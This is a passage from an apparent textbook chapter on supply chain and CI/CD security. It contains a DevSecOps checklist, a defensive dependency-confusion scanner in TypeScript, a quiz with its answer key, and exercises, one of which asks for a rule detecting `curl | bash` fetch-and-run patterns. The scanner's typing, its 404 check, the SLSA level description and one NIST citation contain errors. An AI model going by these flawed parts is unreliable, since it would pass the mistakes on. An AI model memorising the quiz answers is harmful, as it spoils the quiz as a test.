  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-2-devsecops-integration-checklist-handwritten.svg" alt="Handwritten: 16.8.2 DevSecOps Integration Checklist" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-2-devsecops-integration-checklist-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-2-devsecops-integration-checklist-diagram.svg" alt="Diagram: 16.8.2 DevSecOps Integration Checklist" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-2-devsecops-integration-checklist-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-2-devsecops-integration-checklist-sticky.svg" alt="Sticky Note: 16.8.2 DevSecOps Integration Checklist" width="30%">
</a>


| Stage | Tool | Action | When |
|---|---|---|---|
| **Pre-commit** | `gitleaks`, `trufflehog` | Scan for secrets | git hook |
| **Pre-commit** | `eslint-plugin-security` | Detect insecure patterns | git hook |
| **PR Check** | CodeQL, Semgrep | SAST scan | Pull request |
| **PR Check** | `npm audit`, `snyk` | Dependency scan | Pull request |
| **Build** | Syft, CycloneDX | SBOM generation | Every build |
| **Build** | Cosign | Artifact signing | Every release |
| **Build** | SLSA provenance | Provenance attestation | Every release |
| **Container** | Trivy, Grype | Container scan | Image build |
| **Staging** | OWASP ZAP | DAST scan | Pre-release |
| **Production** | Falco, Sysdig | Runtime monitoring | Continuous |

### 16.8.3 Dependency Confusion Scanner (TypeScript)

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-3-dependency-confusion-scanner-typescript-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-3-dependency-confusion-scanner-typescript-handwritten.svg" alt="Handwritten: 16.8.3 Dependency Confusion Scanner (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-3-dependency-confusion-scanner-typescript-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-3-dependency-confusion-scanner-typescript-diagram.svg" alt="Diagram: 16.8.3 Dependency Confusion Scanner (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-3-dependency-confusion-scanner-typescript-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-3-dependency-confusion-scanner-typescript-sticky.svg" alt="Sticky Note: 16.8.3 Dependency Confusion Scanner (TypeScript)" width="30%">
</a>


```typescript
/**
 * Dependency Confusion Scanner
 *
 * Checks if private package names exist in public registries,
 * which would indicate a dependency confusion risk.
 */

import * as https from 'https';
import * as http from 'http';

/* ─── Type Definitions ─── */

interface PackageInfo {
  name: string;
  version: string;
  isScoped: boolean;
  scope?: string;
}

interface RegistryCheckResult {
  packageName: string;
  registryURL: string;
  existsInRegistry: boolean;
  latestVersion: string | null;
  riskLevel: 'NONE' | 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  details: string;
}

interface DependencyConfusionReport {
  scannedAt: string;
  totalPackages: number;
  totalScoped: number;
  totalUnscoped: number;
  results: RegistryCheckResult[];
  summary: {
    critical: number;
    high: number;
    medium: number;
    low: number;
    none: number;
  };
}

/* ─── Registry Checker ─── */

class DependencyConfusionScanner {
  private readonly publicRegistries: string[];
  private readonly privatePackagePatterns: string[];
  private readonly timeoutMs: number;

  constructor(
    options: {
      publicRegistries?: string[];
      privatePackagePatterns?: string[];
      timeoutMs?: number;
    } = {}
  ) {
    this.publicRegistries = options.publicRegistries ?? [
      'https://registry.npmjs.org',
      'https://registry.npmjs.org/@%s',
    ];
    this.privatePackagePatterns = options.privatePackagePatterns ?? [
      // Common patterns for internal packages
      /^internal-/,
      /^private-/,
      /^-lib$/,
      /^@company\//,
      /^@org\//,
      /^@internal\//,
    ];
    this.timeoutMs = options.timeoutMs ?? 5000;
  }

  /**
   * Fetch JSON from a URL with timeout.
   */
  private async fetchJSON(url: string): Promise<unknown> {
    return new Promise((resolve, reject) => {
      const protocol = url.startsWith('https') ? https : http;
      const req = protocol.get(url, { timeout: this.timeoutMs }, (res) => {
        let data = '';
        res.on('data', (chunk: string) => (data += chunk));
        res.on('end', () => {
          try {
            resolve(JSON.parse(data));
          } catch {
            reject(new Error(`Failed to parse JSON from ${url}`));
          }
        });
      });
      req.on('error', (err: Error) => reject(err));
      req.on('timeout', () => {
        req.destroy();
        reject(new Error(`Request to ${url} timed out`));
      });
    });
  }

  /**
   * Check if a package exists in the npm registry.
   */
  private async checkNPMPackage(packageName: string): Promise<{
    exists: boolean;
    latestVersion: string | null;
  }> {
    const url = packageName.startsWith('@')
      ? `https://registry.npmjs.org/${encodeURIComponent(packageName)}`
      : `https://registry.npmjs.org/${packageName}`;

    try {
      const response = (await this.fetchJSON(url)) as Record<string, unknown>;
      if (response && typeof response === 'object' && 'name' in response) {
        const distTags = response['dist-tags'] as Record<string, string> | undefined;
        return {
          exists: true,
          latestVersion: distTags?.latest ?? null,
        };
      }
      return { exists: false, latestVersion: null };
    } catch (error) {
      // 404 or network error — package doesn't exist publicly
      if (error instanceof Error && error.message.includes('406')) {
        return { exists: false, latestVersion: null };
      }
      return { exists: false, latestVersion: null };
    }
  }

  /**
   * Parse package names from a package.json or lock file content.
   */
  parsePackageNames(content: string): PackageInfo[] {
    const packages: PackageInfo[] = [];

    try {
      const pkgJson = JSON.parse(content) as Record<string, unknown>;

      const deps: Record<string, string> = {
        ...(pkgJson.dependencies as Record<string, string> ?? {}),
        ...(pkgJson.devDependencies as Record<string, string> ?? {}),
      };

      for (const [name, version] of Object.entries(deps)) {
        const isScoped = name.startsWith('@');
        packages.push({
          name,
          version,
          isScoped,
          scope: isScoped ? name.split('/')[0] : undefined,
        });
      }
    } catch {
      // If not valid JSON, try line-by-line parsing for lock files
      const lines = content.split('\n');
      const depRegex = /^\s+"([^"]+)":\s*\{/;
      for (const line of lines) {
        const match = line.match(depRegex);
        if (match) {
          const name = match[1];
          if (name && !name.startsWith('node_modules/') && !name.startsWith('@')) {
            packages.push({ name, version: 'unknown', isScoped: false });
          }
        }
      }
    }

    return packages;
  }

  /**
   * Determine if a package name looks like it might be private.
   */
  private isLikelyPrivate(packageName: string): boolean {
    return this.privatePackagePatterns.some((pattern) => pattern.test(packageName));
  }

  /**
   * Scan dependencies for dependency confusion risks.
   */
  async scan(
    packageJsonContent: string
  ): Promise<DependencyConfusionReport> {
    const packages = this.parsePackageNames(packageJsonContent);
    const results: RegistryCheckResult[] = [];

    for (const pkg of packages) {
      const isLikelyPrivate = this.isLikelyPrivate(pkg.name);

      if (pkg.isScoped) {
        // Scoped packages (@scope/name) are safe from confusion
        // by default because they can only come from a configured registry
        results.push({
          packageName: pkg.name,
          registryURL: 'https://registry.npmjs.org',
          existsInRegistry: false,
          latestVersion: null,
          riskLevel: 'NONE',
          details: 'Scoped package — dependency confusion not applicable if scope is configured to private registry.',
        });
        continue;
      }

      // Check if the package exists in the public registry
      const publicInfo = await this.checkNPMPackage(pkg.name);

      if (publicInfo.exists) {
        // Package exists publicly — this is the confusion risk
        const riskLevel = isLikelyPrivate ? 'CRITICAL' : 'HIGH';
        results.push({
          packageName: pkg.name,
          registryURL: 'https://registry.npmjs.org',
          existsInRegistry: true,
          latestVersion: publicInfo.latestVersion,
          riskLevel,
          details: isLikelyPrivate
            ? `Package "${pkg.name}" looks like a private/internal package ` +
              `(matches pattern) but EXISTS in public registry! CRITICAL confusion risk.`
            : `Package "${pkg.name}" exists in public registry ` +
              `(latest: ${publicInfo.latestVersion}). If this is meant to be private, ` +
              `use a scope (@scope/package) and configure .npmrc.`,
        });
      } else {
        // Package does not exist publicly — no confusion risk
        results.push({
          packageName: pkg.name,
          registryURL: 'https://registry.npmjs.org',
          existsInRegistry: false,
          latestVersion: null,
          riskLevel: isLikelyPrivate ? 'LOW' : 'NONE',
          details: isLikelyPrivate
            ? `Package "${pkg.name}" looks like a private package and does NOT exist ` +
              `in public registry. Low risk, but consider scoping it.`
            : `Package "${pkg.name}" does not exist in public registry. No confusion risk.`,
        });
      }
    }

    const summary = {
      critical: results.filter((r) => r.riskLevel === 'CRITICAL').length,
      high: results.filter((r) => r.riskLevel === 'HIGH').length,
      medium: results.filter((r) => r.riskLevel === 'MEDIUM').length,
      low: results.filter((r) => r.riskLevel === 'LOW').length,
      none: results.filter((r) => r.riskLevel === 'NONE').length,
    };

    return {
      scannedAt: new Date().toISOString(),
      totalPackages: packages.length,
      totalScoped: packages.filter((p) => p.isScoped).length,
      totalUnscoped: packages.filter((p) => !p.isScoped).length,
      results,
      summary,
    };
  }
}

// ─── Demonstrations ───

async function demonstrateDependencyConfusionScanner(): Promise<void> {
  const scanner = new DependencyConfusionScanner({
    privatePackagePatterns: [
      /^internal-/,
      /^private-/,
      /^company-/,
      /^myapp-/,
    ],
  });

  const mockPackageJson = JSON.stringify({
    name: 'my-enterprise-app',
    version: '1.0.0',
    dependencies: {
      'express': '^4.18.0',
      'lodash': '^4.17.21',
      'internal-auth-lib': '^2.0.0',
      'private-api-client': '^1.5.0',
      '@company/shared-ui': '^3.0.0',
      'react': '^18.2.0',
    },
    devDependencies: {
      'typescript': '^5.4.0',
      'myapp-test-utils': '^1.0.0',
    },
  });

  console.log('=== Dependency Confusion Scan ===');
  const report = await scanner.scan(mockPackageJson);

  console.log(`Total packages: ${report.totalPackages}`);
  console.log(`  Scoped: ${report.totalScoped}`);
  console.log(`  Unscoped: ${report.totalUnscoped}`);
  console.log(`\nRisk Summary:`);
  console.log(`  CRITICAL: ${report.summary.critical}`);
  console.log(`  HIGH: ${report.summary.high}`);
  console.log(`  MEDIUM: ${report.summary.medium}`);
  console.log(`  LOW: ${report.summary.low}`);
  console.log(`  NONE: ${report.summary.none}`);

  console.log('\nDetails:');
  for (const result of report.results) {
    console.log(`  [${result.riskLevel}] ${result.packageName}`);
    console.log(`    ${result.details}`);
  }
}

void demonstrateDependencyConfusionScanner();
```

---

## Practical Takeaways

| Takeaway | Application |
|----------|-------------|
| Generate SBOMs for every build artifact | Integrate CycloneDX or SPDX generation into your CI/CD pipeline using Syft or CycloneDX CLI |
| Pin all CI/CD actions to commit SHAs | Audit workflows and replace version tags (`@v3`) with full commit hashes to prevent supply chain injection |
| Scope CI/CD token permissions to minimum | Set `permissions: read-all` at the workflow level and override only where write access is strictly required |
| Use ephemeral runners for all CI jobs | Replace persistent self-hosted runners with single-use containers or GitHub-hosted runners to prevent secret leakage |
| Scan all dependencies and containers in CI | Add `npm audit`/`trivy`/`grype` scanning steps after dependency install and container build |
| Sign all artifacts with Sigstore/Cosign | Implement keyless signing in CI; verify signatures at deployment to detect tampering |
| Implement SLSA provenance attestation | Generate in-toto attestations at build time; require L3+ provenance for production deployments |

---

## Summary

This chapter covered the critical topic of software supply chain and CI/CD pipeline security:

1. **Supply Chain Attacks** — We analyzed real-world attacks including SolarWinds (Sunburst), Codecov, Log4j, dependency confusion, and typosquatting. These attacks demonstrate that the software supply chain is a high-value target where compromising one upstream component can cascade to thousands of downstream consumers.

2. **SBOM (Software Bill of Materials)** — SBOMs provide a machine-readable inventory of all software components. We implemented a CycloneDX SBOM generator that parses `package.json` and `node_modules` to produce a structured document. Tools like Syft, Trivy, and CycloneDX CLI automate SBOM generation.

3. **Dependency Security** — We built a dependency vulnerability checker that compares dependencies against a CVE database. We covered tools like `npm audit`, OWASP Dependency Check, Snyk, and GitHub Dependabot. Transitive dependencies represent a significant blind spot that requires deep dependency graph analysis.

4. **CI/CD Pipeline Hardening** — We implemented a CI/CD pipeline security auditor that checks for common misconfigurations including unpinned actions, missing permission scoping, hardcoded secrets, Docker socket mounts, and missing SBOM generation. The CI/CD hardening checklist provided 20 actionable security controls.

5. **Artifact Integrity** — We explored Sigstore/Cosign for container signing and verification, and implemented a software artifact hash verifier. These tools ensure that artifacts haven't been tampered with between build and deployment.

6. **SLSA Framework** — We implemented a SLSA provenance attestation builder that generates in-toto attestations conforming to SLSA v1. The SLSA model provides a graduated path from no guarantees (L0) to maximum security (L4) with two-person review and reproducibility.

7. **DevSecOps Integration** — We covered the integration of SAST, DAST, secrets scanning, container scanning, and fuzzing into CI/CD pipelines. The dependency confusion scanner demonstrated how to proactively identify one of the most common supply chain risks.

---

## Chapter Quiz — Supply Chain & CI/CD Pipeline Security

| # | Question | A | B | C | D | Answer |
|---|----------|---|---|---|---|--------|
| 1 | What was the primary mechanism used by the SolarWinds (Sunburst) attackers to distribute the backdoor? | Phishing emails with malicious attachments | Compromising the SolarWinds build pipeline to inject code into signed Orion updates | Exploiting a zero-day vulnerability in the Orion web console | Social engineering SolarWinds employees to reveal credentials | **B** |
| 2 | What is an SBOM? | A bill of materials for hardware components in data centers | A machine-readable inventory of all software components, versions, and dependencies in an application | A security baseline operating model for DevSecOps teams | A build optimization methodology for container images | **B** |
| 3 | Which SLSA level requires two-person review for all build steps? | SLSA L1 | SLSA L2 | SLSA L3 | SLSA L4 | **D** |
| 4 | In a dependency confusion attack, an attacker: | Modifies the source code of a popular open-source library | Publishes a package with the same name as a private package to a public registry with a higher version number | Plants malicious code in a CI/CD pipeline configuration | Intercepts network traffic to steal package credentials | **B** |
| 5 | Which tool is part of the Sigstore project for signing container images? | Trivy | Cosign | Syft | Grype | **B** |
| 6 | What is the purpose of generating a provenance attestation in a CI/CD pipeline? | To measure build performance metrics | To create an auditable record of how an artifact was built, by whom, and from what source | To comply with GDPR data retention requirements | To generate API documentation automatically | **B** |
| 7 | Which of the following is a valid defense against typosquatting attacks? | Always installing packages with `--save-exact` flag | Using a package allowlist and implementing Levenshtein distance checks on package names | Disabling npm audit in CI/CD pipelines | Only using devDependencies in production builds | **B** |
| 8 | What is a primary risk of using self-hosted CI/CD runners? | Slower build times compared to cloud runners | Persistent state between builds may leak secrets from previous runs | Self-hosted runners cannot cache dependencies | They cannot run containerized builds | **B** |
| 9 | What does a "hermetic build" mean in the context of SLSA? | The build runs in an isolated container | The build is fully sealed and does not access the network for any purpose — all dependencies are pre-fetched and verified | The build output is encrypted before storage | The build is reproducible across different operating systems | **B** |
| 10 | Which of the following is an example of a SAST (Static Application Security Testing) tool? | OWASP ZAP | Trivy | CodeQL | Falco | **C** |

---

## Exercises

<details>
<summary>Solution</summary>

### Exercise 1: SBOM Analysis and Validation

**Objective:** Generate and validate an SBOM for a real or simulated project.

**Tasks:**
1. Create a `package.json` with 5+ dependencies (including some with known vulnerabilities).
2. Extend the `CycloneDXSBOMGenerator` to support outputting SPDX format in addition to CycloneDX.
3. Run the `CycloneDXValidator` on the generated SBOM and fix any validation errors.
4. Add license URL resolution — for each component, fetch the license URL from the npm registry.

**Deliverable:** Generated SBOM JSON file + validation report.

---

### Exercise 2: CI/CD Pipeline Security Audit

**Objective:** Audit a sample GitHub Actions workflow for security misconfigurations.

**Tasks:**
1. Create a GitHub Actions workflow with at least 5 deliberate misconfigurations (e.g., unpinned actions, missing permissions, hardcoded secrets, Docker socket mount, self-hosted runner).
2. Run the `CICDPipelineAuditor` against your workflow.
3. Fix all issues identified in the audit report.
4. Add a rule to the auditor that checks for the use of `curl | bash` unsafe patterns.

**Deliverable:** Original (insecure) workflow, audit report, and fixed (hardened) workflow.

---

### Exercise 3: Dependency Confusion Defense

**Objective:** Scan a project for dependency confusion vulnerabilities and implement defenses.

**Tasks:**
1. Create a `package.json` with at least 3 "private" packages (e.g., `internal-auth`, `company-logger`, `secret-sauce`).
2. Run the `DependencyConfusionScanner` against it.
3. For each CRITICAL finding, propose a remediation strategy.
4. Implement a `.npmrc` configuration that scopes all internal packages to a private registry.

**Deliverable:** Scan report + `.npmrc` configuration + recommendations document.

---

### Exercise 4: Container Image Signing and Verification

**Objective:** Implement a cosign-like verification workflow for container images.

**Tasks:**
1. Extend the `CosignVerifier` class to support:
   - Multiple signature verification (key + keyless simultaneously)
   - Policy enforcement using `CosignPolicy` (check allowed identities)
   - Signature expiry validation
2. Create a policy that only allows images signed by `dev@company.com` from issuer `https://accounts.google.com`.
3. Test with a simulated image that has valid and invalid signatures.

**Deliverable:** Policy-driven verification implementation with test cases.

---

### Exercise 5: Full SLSA L3 Pipeline Implementation

**Objective:** Design and implement a complete SLSA L3-compliant pipeline configuration.

**Tasks:**
1. Create a GitHub Actions workflow that:
   - Generates an SBOM (CycloneDX or SPDX)
   - Runs dependency vulnerability scanning
   - Signs the build artifact using Cosign (keyless)
   - Builds a SLSA provenance attestation
   - Runs container image scanning with Trivy
   - Generates a signed DSSE envelope for the attestation
2. Verify that the pipeline meets all SLSA L3 requirements.
3. Add hermetic build verification (check that no network requests are made during build).

**Deliverable:** Full `.github/workflows/slsa-l3.yml` pipeline + attestation output.

---

### Exercise 6: Vulnerability Scanning Automation

**Objective:** Build a vulnerability report aggregator across multiple dependency scanning tools.

**Tasks:**
1. Extend the `DependencyVulnerabilityChecker` to support:
   - Multiple CVE database sources (NVD, OSV, GitHub Advisory Database)
   - Severity score aggregation
   - Auto-suggested fix versions with upgrade path analysis
2. Implement a `VulnerabilityReport` class that generates:
   - A human-readable markdown report
   - A machine-readable JSON report with CVE IDs
   - A dependency graph showing vulnerable paths
3. Add transitive dependency vulnerability propagation (if library A depends on vulnerable library B, show the full path).

**Deliverable:** Vulnerability report generator with markdown and JSON output.

---

### Exercise 7: Package Manager Security Analysis

**Objective:** Implement a comprehensive package manager security scanner.

**Tasks:**
1. Create a `PackageSecurityScanner` that checks:
   - Package age (packages < 30 days old are high risk)
   - Number of maintainers (single maintainer is higher risk)
   - Package download count and trend
   - Last publish date (abandoned packages > 2 years)
   - Presence of known typosquatting targets
2. Implement a risk scoring algorithm (0–100) based on these factors.
3. Test against 10 popular packages and 10 suspicious packages.

**Deliverable:** Scanner implementation with risk scores and a report comparing legitimate vs. suspicious packages.

---

### Exercise 8: in-toto Attestation Chain Verification

**Objective:** Implement verification of an in-toto software supply chain attestation chain.

**Tasks:**
1. Create an `InTotoVerifier` class that:
   - Parses multiple in-toto attestation links
   - Verifies the chain of custody (developer → build → test → deploy)
   - Validates signatures at each link
   - Reports any gaps or inconsistencies in the chain
2. Simulate a complete attestation chain with 4 steps.
3. Test a tampered chain where one link has been modified.

**Deliverable:** Attestation chain verifier with test cases for valid and tampered chains.

</details>

---

## References

1. **SolarWinds SUNBURST Attack Technical Analysis** — FireEye/Mandiant Report (2020)
2. **Codecov Breach Analysis** — Trail of Bits (2021)
3. **CVE-2021-44228 (Log4Shell)** — Apache Foundation Advisory
4. **SLSA Framework** — slsa.dev
5. **Sigstore/Cosign Documentation** — sigstore.dev
6. **CycloneDX SBOM Standard** — cyclonedx.org (OWASP)
7. **SPDX SBOM Standard** — spdx.dev (Linux Foundation)
8. **TUF (The Update Framework)** — theupdateframework.io
9. **in-toto Attestations** — in-toto.io
10. **OWASP Dependency Check** — owasp.org/www-project-dependency-check/
11. **GitHub Actions Security Hardening** — docs.github.com/en/actions/security-guides
12. **NIST SP 800-204: Secure Software Development Framework** — NIST
13. **Google's SLSA Provenance Generator** — github.com/slsa-framework/slsa-github-generator
14. **Sigstore Fulcio** — sigstore.dev/fulcio (OIDC-based certificate authority)
15. **Docker Content Trust / Notary** — docs.docker.com/engine/security/trust/
